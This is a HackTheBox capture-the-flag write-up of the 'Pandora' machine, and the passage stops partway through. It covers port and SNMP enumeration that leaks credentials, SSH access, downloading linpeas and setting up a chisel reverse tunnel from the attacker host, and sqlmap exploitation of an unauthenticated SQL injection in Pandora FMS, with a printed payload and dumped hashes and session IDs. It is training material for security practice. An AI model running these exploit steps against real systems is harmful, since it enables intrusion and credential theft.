---
title: "HackTheBox: Pandora"
layout: post
categories: HackTheBox
---

# Enumeration  

## Nmap  

```bash
┌──(herc㉿kali)-[/CTF/HTB/Pandora]
└─$ `sudo nmap -sC -sV -p- -oA nmap/all-ports 10.10.11.136`
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-25 13:49 CET
Nmap scan report for 10.10.11.136
Host is up (0.052s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.33 seconds
```

`nmap` finds two ports open which are ssh and http.  
Based on OpenSSH and Apache versions the host is likely running on Ubuntu Focal 20.04.  

## Website  

[![Capture.png](https://i.postimg.cc/gcyXs7H4/Capture.png)](https://postimg.cc/V56kLDTb)

Lookin at the website we get greeted with "Play" theme and we can already see that there is a host `Panda.HTB`  
on the front page but when I added it to the `/etc/hosts` it gives me same results.  

### Web birectory enumeration  

```bash
┌──(herc㉿kali)-[~]
└─$ `feroxbuster -u http://panda.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt` 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.6.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://panda.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.6.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      907l     2081w    33560c http://panda.htb/
403      GET        9l       28w      274c http://panda.htb/.php
403      GET        9l       28w      274c http://panda.htb/.html
301      GET        9l       28w      307c http://panda.htb/assets => http://panda.htb/assets/
403      GET        9l       28w      274c http://panda.htb/.htaccess
403      GET        9l       28w      274c http://panda.htb/.htm
403      GET        9l       28w      274c http://panda.htb/.phtml
403      GET        9l       28w      274c http://panda.htb/.htc
403      GET        9l       28w      274c http://panda.htb/.html_var_DE
403      GET        9l       28w      274c http://panda.htb/server-status
403      GET        9l       28w      274c http://panda.htb/.htpasswd
403      GET        9l       28w      274c http://panda.htb/.html.
403      GET        9l       28w      274c http://panda.htb/.html.html
403      GET        9l       28w      274c http://panda.htb/.htpasswds
403      GET        9l       28w      274c http://panda.htb/.htm.
403      GET        9l       28w      274c http://panda.htb/.htmll
403      GET        9l       28w      274c http://panda.htb/.phps
403      GET        9l       28w      274c http://panda.htb/.html.old
403      GET        9l       28w      274c http://panda.htb/.ht
403      GET        9l       28w      274c http://panda.htb/.html.bak
403      GET        9l       28w      274c http://panda.htb/.htm.htm
403      GET        9l       28w      274c http://panda.htb/.hta
403      GET        9l       28w      274c http://panda.htb/.htgroup
403      GET        9l       28w      274c http://panda.htb/.html1
403      GET        9l       28w      274c http://panda.htb/.html.printable
403      GET        9l       28w      274c http://panda.htb/.html.LCK
403      GET        9l       28w      274c http://panda.htb/.htm.LCK
403      GET        9l       28w      274c http://panda.htb/.htaccess.bak
403      GET        9l       28w      274c http://panda.htb/.html.php
403      GET        9l       28w      274c http://panda.htb/.htmls
403      GET        9l       28w      274c http://panda.htb/.htx
403      GET        9l       28w      274c http://panda.htb/.htm2
403      GET        9l       28w      274c http://panda.htb/.htlm
403      GET        9l       28w      274c http://panda.htb/.html-
403      GET        9l       28w      274c http://panda.htb/.htuser
[####################] - 1m    129012/129012  0s      found:35      errors:0      
[####################] - 1m     43004/43004   695/s   http://panda.htb 
[####################] - 1m     43004/43004   692/s   http://panda.htb/ 
[####################] - 0s     43004/43004   0/s     http://panda.htb/assets => Directory listing (add -e to scan)
```

`Feroxbuster` did't really find anything interesting.  

### Subodmain Enumeration  

```bash
┌──(herc㉿kali)-[~]
└─$ `wfuzz -c -u 'http://panda.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.panda.htb" --hw 2081`
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://panda.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000009532:   400        10 L     35 W       301 Ch      "#www"                                                                                                                      
000010581:   400        10 L     35 W       301 Ch      "#mail"                                                                                                                     
000047706:   400        10 L     35 W       301 Ch      "#smtp"                                                                                                                     
000103135:   400        10 L     35 W       301 Ch      "#pop3"                                                                                                                     

Total time: 828.2730
Processed Requests: 114441
Filtered Requests: 114437
Requests/sec.: 138.1681
```

`wfuzz` also didnt find any subodmains and the reason I have `--hw 2081` options set is beacause  
I already ran the scan and it gives alot of messy output with 2081 word length results I can just hide them  
and that way make results cleaner in my terminal.  

## Nmap UDP  

While I was scanning website and trying to find something with fail I ran an UDP scan in background.  

```bash
┌──(herc㉿kali)-[/CTF/HTB/Pandora]
└─$ `sudo nmap -sU -v 10.10.11.136`
[sudo] password for herc: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-25 14:21 CET
Initiating Ping Scan at 14:21
Scanning 10.10.11.136 [4 ports]
Completed Ping Scan at 14:21, 0.09s elapsed (1 total hosts)
Scanning panda.htb (10.10.11.136) [1000 ports]
Discovered open port 161/udp on 10.10.11.136
Completed UDP Scan at 14:38, 998.86s elapsed (1000 total ports)
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.043s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 999.12 seconds
           Raw packets sent: 1119 (51.547KB) | Rcvd: 1190 (119.736KB)
```

`nmap` found an interesting port 161 wich is `SNMP`.

`Simple Network Management Protocol (SNMP)` is a networking protocol used for the management and  
monitoring of network-connected devices in Internet Protocol networks. `SNMP` provides a common mechanism  
for network devices to relay management information within single and multi-vendor LAN or WAN environments.  

With this information we can now get some information with `snmp` scripts.  
Luckily `nmap` has them as NSE scripts and uses them automatically using `-A` "aggressive" flag.  

What this does it some of the scripts acts as snmp client and can extract information out of it.  

```bash
┌──(herc㉿kali)-[/CTF/HTB/Pandora]
└─$ `sudo nmap -sU -sC -sV -A -p161 10.10.11.136`
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-25 14:43 CET
Stats: 0:02:48 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.31% done; ETC: 14:46 (0:00:01 remaining)
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.051s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)

...[SNIP]...

1120: 
|     Name: host_check
|     Path: /usr/bin/host_check
|     Params: -u daniel -p HotelBabylon23

...[SNIP]...

```

Looking through the long output we can see finally see some credentials.  
With this we can obviously try `ssh` or some login directory on web but since I didn't find anything  
it must be `ssh`.  

# Shell as User

```bash
daniel@pandora:~$
```

YESS! It was a successuful attempt.  

# Privilege Escalation  

```bash
daniel@pandora:~$ sudo -l
[sudo] password for daniel: 
Sorry, user daniel may not run sudo on pandora.
```

Since there was no quick wins using classic `sudo -l` I will run `linpeas`.  

So I will need to transfer file from my Attack machine over to the box.  

First I start a python3 mini server with linpeas hosting in it.  

```bash
┌──(herc㉿kali)-[/opt/PrivEsc]
└─$ ls
linpeas.sh
                                                                                                                                                                                             
┌──(herc㉿kali)-[/opt/PrivEsc]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Then I download it from my hosted mini server and put it in `/tmp` directory.  

```bash
daniel@pandora:~$ wget http://10.10.14.2:8000/linpeas.sh -o /tmp/linpeas.sh
```

And of course make it executable.  

```bash
daniel@pandora:/tmp$ chmod +x linpeas.sh 
```

Now next I will try to find anything interesting for Privilege Escalation.  

```bash

...[SNIP]...

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                                     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                                            
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -

...[SNIP]...

```

Now this was interesting to me beacause there is a port 80 running on `tcp6` and I wanted to examine it more.  
Since it is a port 80 or http port we can use something simple as curl to examine it.  

```bash
daniel@pandora:~$ curl 127.0.0.1:80
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
```

And indeed it does we can see some sort of url directory.  
I am now going to port forward this port/make a TCP tunnel using chisel.  
You can download chisel from here:  
> https://github.com/jpillora/chisel

First off we start a listening server on our Attackingg machine and I choose port 8000.  

```bash
┌──(herc㉿kali)-[/opt/PrivEsc]
└─$ `./chisel server -p 8000 --reverse`
2022/03/25 15:14:09 server: Reverse tunnelling enabled
2022/03/25 15:14:09 server: Fingerprint hxf4AbOWXm2Lw8gVroQT1VaTiJityeZ0f8xtpqiBLjY=
2022/03/25 15:14:09 server: Listening on http://0.0.0.0:8000
```

Next upload chisel binary to the box however you want obviously python3 mini server imo. best.  
And then on the box create a tunnel with ports we need.  

```bash
daniel@pandora:/tmp$ ./chisel client 10.10.14.2:8000 R:80:127.0.0.1:80
2022/03/25 14:37:10 client: Connecting to ws://10.10.14.2:8000
2022/03/25 14:37:11 client: Connected (Latency 44.292333ms)
```

Like this and then we can see that it is working if we check back to oue chisel server terminal pane  

```bash
2022/03/25 15:18:42 server: session#1: tun: proxy#R:80=>80: Listening
```

[![Capture.png](https://i.postimg.cc/rp25Nyym/Capture.png)](https://postimg.cc/CRJZFgqT)

Right off the bat we can see it is some kind of software and we can also see the version of  
`Pandora` down below which I boxed in red for better visibility.  

[![Capture.png](https://i.postimg.cc/GpnST1ZP/Capture.png)](https://postimg.cc/xXgPBBjq)

I tried using default admin credentials with fail.  
Also credentials we found previously `daniel:HotelBabylon23` also didn't work.  
so next I will try to google for some exploits since we have version.  

## Unauthenticated SQL Injection  

After a bit of research I found there is a SQLi in `/include/chart_generator.php?session_id=` parameter.  
you can see more details on this link since person behind this post goes in depth:  
> https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained

So obviously since there is a SQLi somewhere first thig I do i pop up my favourite `sqlmap` tool :).  

```bash
┌──(herc㉿kali)-[~]
└─$ `sqlmap --url="127.0.0.1/pandora_console/include/chart_generator.php?session_id=''" --batch --dbs`

...[SNIP]...

[15:34:39] [INFO] fetching database names
[15:34:39] [INFO] retrieved: 'information_schema'
[15:34:39] [INFO] retrieved: 'pandora'
available databases [2]:
[*] information_schema
[*] pandora
```

Here we can see that injection was successful and there is interesting `Pandora database`.  
If you are wondering what the payload is you can run the sqlmap for yourself but if you are only  
reading this I will be a good preson and paste it here:  
`Payload: session_id=''' RLIKE (SELECT (CASE WHEN (1789=1789) THEN 0x2727 ELSE 0x28 END))-- mTKo`  

Next we search for tables inside `pandora` database.  

```bash
┌──(herc㉿kali)-[~]
└─$ `sqlmap --url="127.0.0.1/pandora_console/include/chart_generator.php?session_id=''" --batch -D pandora --tables`

...[SNIP]...

[178 tables]
+------------------------------------+
| taddress                           |
| taddress_agent                     |
| tagent_access                      |
| tagent_custom_data                 |
| tagent_custom_fields               |
| tagent_custom_fields_filter        |
| tagent_module_inventory            |
| tagent_module_log                  |
| tagent_repository                  |
| tagent_secondary_group             |
| tagente                            |
| tagente_datos                      |
| tagente_datos_inc                  |
| tagente_datos_inventory            |
| tagente_datos_log4x                |
| tagente_datos_string               |
| tagente_estado                     |
| tagente_modulo                     |
| talert_actions                     |
| talert_commands                    |
| talert_snmp                        |
| talert_snmp_action                 |
| talert_special_days                |
| talert_template_module_actions     |
| talert_template_modules            |
| talert_templates                   |
| tattachment                        |
| tautoconfig                        |
| tautoconfig_actions                |
| tautoconfig_rules                  |
| tcategory                          |
| tcluster                           |
| tcluster_agent                     |
| tcluster_item                      |
| tcollection                        |
| tconfig                            |
| tconfig_os                         |
| tcontainer                         |
| tcontainer_item                    |
| tcredential_store                  |
| tdashboard                         |
| tdatabase                          |
| tdeployment_hosts                  |
| tevent_alert                       |
| tevent_alert_action                |
| tevent_custom_field                |
| tevent_extended                    |
| tevent_filter                      |
| tevent_response                    |
| tevent_rule                        |
| tevento                            |
| textension_translate_string        |
| tfiles_repo                        |
| tfiles_repo_group                  |
| tgis_data_history                  |
| tgis_data_status                   |
| tgis_map                           |
| tgis_map_connection                |
| tgis_map_has_tgis_map_con          |
| tgis_map_layer                     |
| tgis_map_layer_groups              |
| tgis_map_layer_has_tagente         |
| tgraph                             |
| tgraph_source                      |
| tgraph_source_template             |
| tgraph_template                    |
| tgroup_stat                        |
| tgrupo                             |
| tincidencia                        |
| titem                              |
| tlanguage                          |
| tlayout                            |
| tlayout_data                       |
| tlayout_template                   |
| tlayout_template_data              |
| tlink                              |
| tlocal_component                   |
| tlog_graph_models                  |
| tmap                               |
| tmensajes                          |
| tmetaconsole_agent                 |
| tmetaconsole_agent_secondary_group |
| tmetaconsole_event                 |
| tmetaconsole_event_history         |
| tmetaconsole_setup                 |
| tmigration_module_queue            |
| tmigration_queue                   |
| tmodule                            |
| tmodule_group                      |
| tmodule_inventory                  |
| tmodule_relationship               |
| tmodule_synth                      |
| tnetflow_filter                    |
| tnetflow_report                    |
| tnetflow_report_content            |
| tnetwork_component                 |
| tnetwork_component_group           |
| tnetwork_map                       |
| tnetwork_matrix                    |
| tnetwork_profile                   |
| tnetwork_profile_component         |
| tnetworkmap_ent_rel_nodes          |
| tnetworkmap_enterprise             |
| tnetworkmap_enterprise_nodes       |
| tnews                              |
| tnota                              |
| tnotification_group                |
| tnotification_source               |
| tnotification_source_group         |
| tnotification_source_group_user    |
| tnotification_source_user          |
| tnotification_user                 |
| torigen                            |
| tpassword_history                  |
| tperfil                            |
| tphase                             |
| tplanned_downtime                  |
| tplanned_downtime_agents           |
| tplanned_downtime_modules          |
| tplugin                            |
| tpolicies                          |
| tpolicy_agents                     |
| tpolicy_alerts                     |
| tpolicy_alerts_actions             |
| tpolicy_collections                |
| tpolicy_groups                     |
| tpolicy_modules                    |
| tpolicy_modules_inventory          |
| tpolicy_plugins                    |
| tpolicy_queue                      |
| tprofile_view                      |
| tprovisioning                      |
| tprovisioning_rules                |
| trecon_script                      |
| trecon_task                        |
| trel_item                          |
| tremote_command                    |
| tremote_command_target             |
| treport                            |
| treport_content                    |
| treport_content_item               |
| treport_content_item_temp          |
| treport_content_sla_com_temp       |
| treport_content_sla_combined       |
| treport_content_template           |
| treport_custom_sql                 |
| treport_template                   |
| treset_pass                        |
| treset_pass_history                |
| tserver                            |
| tserver_export                     |
| tserver_export_data                |
| tservice                           |
| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
| tsnmp_filter                       |
| ttag                               |
| ttag_module                        |
| ttag_policy_module                 |
| ttipo_modulo                       |
| ttransaction                       |
| ttrap                              |
| ttrap_custom_values                |
| tupdate                            |
| tupdate_journal                    |
| tupdate_package                    |
| tupdate_settings                   |
| tuser_double_auth                  |
| tuser_task                         |
| tuser_task_scheduled               |
| tusuario                           |
| tusuario_perfil                    |
| tvisual_console_elements_cache     |
| twidget                            |
| twidget_dashboard                  |
+------------------------------------+
```

Here on I found interesting table called `tpassword_history` which I managed to dump.  

```bash
┌──(herc㉿kali)-[~]
└─$ sqlmap --url="127.0.0.1/pandora_console/include/chart_generator.php?session_id=''" --batch -D pandora -T tpassword_history --dump

...[SNIP]...

+---------+---------+---------------------+----------------------------------+---------------------+
| id_pass | id_user | date_end            | password                         | date_begin          |
+---------+---------+---------------------+----------------------------------+---------------------+
| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
| 3       | uwusama | 0000-00-00 00:00:00 | 174a3f4fa44c7bb22b3b6429cb4ea44c | 2022-03-25 09:04:43 |
+---------+---------+---------------------+----------------------------------+---------------------+
```

But this didn't seem like I am supposed to do so since I couln't crack them nor login there  
was one more interesting table called `tsessions_php` so I dumped that next.  

```bash
┌──(herc㉿kali)-[~]
└─$ `sqlmap --url="127.0.0.1/pandora_console/include/chart_generator.php?session_id=''" --batch -D pandora -T tsessions_php --dump`

...[SNIP]...

+----------------------------+--------------------------------------------------------------------------------------------------------------------------------+-------------+
| id_session                 | data                                                                                                                           | last_active |
+----------------------------+--------------------------------------------------------------------------------------------------------------------------------+-------------+
| 08js3gd2m4onhs2vm539ieqhic | NULL                                                                                                                           | 1648194248  |
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                                                                                                       | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                                                                                           | 1638789018  |
| 0sj46b97em8uq9tr1nuvj8femk | NULL                                                                                                                           | 1648200001  |
| 12k9d7bg0u7kq0llmu5bvm4j6v | NULL                                                                                                                           | 1648220051  |
| 14voq2vee2hk3kimmt6qtg5sgp | NULL                                                                                                                           | 1648220035  |
| 1dmjipe16olo2sr1k6ha7slvmh | id_usuario|s:6:"daniel";                                                                                                       | 1648194233  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                                                                                           | 1638792211  |
| 22kotk0ki2rkb6kmh61ma3q8l8 | NULL                                                                                                                           | 1648208265  |
| 24uflog9oqp5gc3uah9vja3755 | NULL                                                                                                                           | 1648214243  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                                                                                           | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                                                                                                       | 1638540332  |
| 3i7tce1bel3mtkd36l2qk0a231 | NULL                                                                                                                           | 1648220041  |
| 3jeg96k9egir43tgl8oesa2bti | NULL                                                                                                                           | 1648220056  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                                                                                           | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                                                                                           | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                                                                                                       | 1638535373  |
| 4qi2v8lqomvqpept62a03m031i | NULL                                                                                                                           | 1648220108  |
| 57n3rm1bcusfpii47594l43jnb | NULL                                                                                                                           | 1648220789  |
| 59qae699l0971h13qmbpqahlls | NULL                                                                                                                           | 1638787305  |
| 5a56k2tlombbfvj8i6a5glnbuk | NULL                                                                                                                           | 1648220116  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                                                                                           | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                                                                                                       | 1638281946  |
| 5ksfr2i8pb4mhfqjo1lrms2bk4 | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;                                                                           | 1648218151  |
| 5q0pnq138k89skptub0jv4c608 | NULL                                                                                                                           | 1648194267  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                                                                                                       | 1641195617  |
| 6ma90uoeuits715aojba4jmeon | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:"49c0a3de82bdf45eb433bb291f1e5e9d";menu_type|s:7:"classic"; | 1648212854  |
| 6me1shm56aipf8dsog8jh2eod1 | NULL                                                                                                                           | 1648214301  |
| 76oov0a59ret0hbp65643qhud4 | NULL                                                                                                                           | 1648214395  |
| 79pev3l71i53s8ist5c9374fu5 | NULL                                                                                                                           | 1648194915  |
| 7qu6c9tdheqvha5rs3fhgei9fh | NULL                                                                                                                           | 1648195161  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                                                                                           | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                                                                                                       | 1638446321  |
| 8m74cnkfgk4gtrkm0inkdfgsbo | NULL                                                                                                                           | 1648219182  |
| 8o4opjkuav0a5gratkk9u2gvhv | NULL                                                                                                                           | 1648214136  |
| 8s9cpdv5nmeeogatljirmab9ps | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;                                                                            | 1648216745  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                                                                                           | 1638787267  |
| 9cqckt60rop4rho5i519nv6r4q | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;                                                                            | 1648216602  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                                                                                                       | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                                                                                           | 1638795315  |
| a9hfc3v2ghn7mv783hqvlinunv | NULL                                                                                                                           | 1648214479  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                                                                                                       | 1638881664  |
| asv7lj242br26f8gmkd9rjtci9 | NULL                                                                                                                           | 1648195132  |
| bjur65sneopu0ut1lt6aa79dm6 | NULL                                                                                                                           | 1648219066  |
| c37d5icqbjbt5ootm45sv9hlkv | NULL                                                                                                                           | 1648220780  |
| cmpt5gq6qecgfsshsa73gqgmhr | NULL                                                                                                                           | 1648220417  |
| cog3vlttpk4gh3t3lisudc7a4h | NULL                                                                                                                           | 1648220042  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                                                                                           | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                                                                                           | 1638786277  |
| d276ji4r2mte9vmgkp1nk50095 | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;                                                                            | 1648216757  |
| d8tjba7ebcfiacu2ocme0jrbp5 | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;                                                                            | 1648216748  |
| e350v6urleeaot7vs0f3c45f8i | id_usuario|s:6:"daniel";                                                                                                       | 1648216042  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                                                                                                       | 1641200284  |
| fe0m360sfubkg4biud7fv2hl2g | NULL                                                                                                                           | 1648194417  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                                                                                           | 1638786504  |
| fl3gh89nnhd3hujv9qf2uqs8j9 | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;                                                                            | 1648218073  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                                                                                           | 1638786762  |
| fql3biigcgjbs2brqpoat07pvb | NULL                                                                                                                           | 1648208505  |
| fundv2bp1lllrf73orlv8ddbnc | NULL                                                                                                                           | 1648208633  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                                                                                                       | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:"d40cb71cf479ca6fede446a6ed89837f";                          | 1648219214  |
| gc99n0pkm4aq7tngg7rkmdjiga | NULL                                                                                                                           | 1648194942  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                                                                                           | 1638786349  |
| go3svedg9bh3be5gk3i78o118j | NULL                                                                                                                           | 1648213602  |
| h4hc9393v5ojok6cg9vsab4p5g | NULL                                                                                                                           | 1648220785  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                                                                                           | 1638540345  |
| hj226q34eccbkimc97ght61gra | NULL                                                                                                                           | 1648214330  |
| hr4486vv1ml55qdvrvgsk2hlj9 | NULL                                                                                                                           | 1648214928  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                                                                                                       | 1638168492  |
| i041nb4uvtqj7ineuegsi4l5hr | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;                                                                            | 1648216521  |
| i4lej9gid20s6aus4ur8jeqhsb | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:"342ef8640953d726760ba44285306078";                         | 1648195692  |
| i8uh7sqpnit5j9r6k9g669bfrj | NULL                                                                                                                           | 1648216365  |
| iligmijjnbcdhget5aut8n2aqv | NULL                                                                                                                           | 1648220216  |
| imgvisi12pshg3cu4d1pelmofl | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;                                                                           | 1648200231  |
| iqa6phk7fr7592k7mk484rkkbc | id_usuario|s:5:"admin";                                                                                                        | 1648210557  |
| iv4qrjqcb6eedp8kgkidav4tkl | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;                                                                           | 1648219318  |
| j03iusd8bgfgn59a0ojjs1v04r | NULL                                                                                                                           | 1648218027  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                                                                                                       | 1638456173  |
| jniu7vt12lqb4gb6o7s8fqf114 | NULL                                                                                                                           | 1648219948  |
| k9dunnl2nmea7aneqim1i8p4rh | NULL                                                                                                                           | 1648214406  |
| kf6emc7v19tmvuejn6mevavpdv | NULL                                                                                                                           | 1648208521  |
| kkkcajia9r0frniki06thrg3sp | NULL                                                                                                                           | 1648214452  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                                                                                           | 1638787808  |
| kv49hon5cv4b81sma83jg9djq9 | NULL                                                                                                                           | 1648208228  |
| limjhvj3nabi7je7qds007h1hi | NULL                                                                                                                           | 1648212828  |
| m040mg40st671lehvc0bmugfj8 | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;                                                                           | 1648200386  |
| mtgrev1ucjpk7o5drrb3qqam33 | NULL                                                                                                                           | 1648219989  |
| n0fo67b77678lkl7iqnd7kq9m6 | NULL                                                                                                                           | 1648220126  |
| n0nrc7mf41lpteadtucu2envtj | NULL                                                                                                                           | 1648219630  |
| nbhpdod3isup489cg4v2vgemo1 | NULL                                                                                                                           | 1648220078  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                                                                                           | 1638796348  |
| nvhtioc7ckdf68kpd0vcd1dkh2 | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;                                                                            | 1648216668  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                                                                                                       | 1638540482  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                                                                                                       | 1637667827  |
| op6qb9epjd5fmlvubd2lql23ud | NULL                                                                                                                           | 1648200003  |
| p6d9urmbe12i6nasefbig1ohne | NULL                                                                                                                           | 1648219355  |
| p8966te9ng09gjel9soqg6fpch | NULL                                                                                                                           | 1648194658  |
| p989106iaj4gv7jo3qga3kt8hi | NULL                                                                                                                           | 1648219884  |
| p9mqc82nss6ju9kglvmo8n1oei | NULL                                                                                                                           | 1648216853  |
| p9n3hlsu94oqunvdsj8ln0t324 | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;                                                                           | 1648200341  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                                                                                                       | 1638168416  |
| pmfle26jmm0s4bqgfrmiip31rh | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;                                                                            | 1648216592  |
| q4fhen11fnll9vpfd89k1mr1t7 | NULL                                                                                                                           | 1648208553  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                                                                                           | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                                                                                           | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                                                                                                       | 1638889082  |
| tlagedio7bl59su33r29ppe4qb | NULL                                                                                                                           | 1648214444  |
| u1kudss7r79m6n15glf9r4mhnp | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;                                                                           | 1648220263  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                                                                                                       | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                                                                                                       | 1638793297  |
| u96etqg70rgu9akh0g47a41sv2 | NULL                                                                                                                           | 1648194544  |
| ur9uaolleepl77b89gs1u9aoe9 | NULL                                                                                                                           | 1648220240  |
| ut9j43rhqd1gv2829gp5mfskrg | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;                                                                            | 1648216534  |
| vfd24n3mcad18ihbob3q70hchf | id_usuario|s:5:"admin";                                                                                                        | 1648194844  |
| vjlk5801eg1k2tjfk55m9mhqs5 | NULL                                                                                                                           | 1648212870  |
+----------------------------+--------------------------------------------------------------------------------------------------------------------------------+-------------+
```

This made much more sense to me since we already had `session_id=` parameter that was injectable  
